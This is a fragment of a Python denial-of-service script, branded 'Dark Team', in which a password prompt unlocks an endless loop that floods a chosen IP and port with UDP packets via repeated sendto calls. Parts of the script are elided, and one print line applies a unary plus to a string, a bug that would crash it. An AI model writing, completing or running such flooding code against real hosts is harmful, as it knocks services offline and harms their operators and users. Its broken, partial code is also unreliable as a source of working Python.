...
for i in range(3):
    pwd = input("\033[91m[+] PASSWORD :")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("\033[92m[•] Wait 5 second to start DDOS!!!")
        break
    else:
        time.sleep(5)
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91mDark Team Attack ip \033[36m%s \033[91mPort \033[36m%s"%(ip,port))
		except:
			print("\033[91mDark Team Attack ip \033[36m%s \033[91mPort \033[36m%s"%(ip,port))
